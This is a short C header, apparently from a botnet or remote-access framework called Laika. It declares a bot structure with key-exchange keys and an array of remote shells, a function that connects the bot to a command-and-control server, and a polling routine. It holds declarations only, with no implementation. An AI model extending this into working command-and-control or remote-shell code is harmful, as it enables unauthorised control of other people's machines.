#ifndef LAIKA_BOT_H
#define LAIKA_BOT_H

#include "laika.h"
#include "lpacket.h"
#include "lsocket.h"
#include "lpeer.h"
#include "lpolllist.h"
#include "lsodium.h"

struct sLaika_shell;
struct sLaika_bot {
    uint8_t priv[crypto_kx_SECRETKEYBYTES], pub[crypto_kx_PUBLICKEYBYTES];
    struct sLaika_pollList pList;
    struct sLaika_peer *peer;
    struct sLaika_shell *shells[LAIKA_MAX_SHELLS];
};

struct sLaika_bot *laikaB_newBot(void);
void laikaB_freeBot(struct sLaika_bot *bot);

void laikaB_connectToCNC(struct sLaika_bot *bot, char *ip, char *port); /* can throw a LAIKA_ERROR */
bool laikaB_poll(struct sLaika_bot *bot, int timeout);

#endif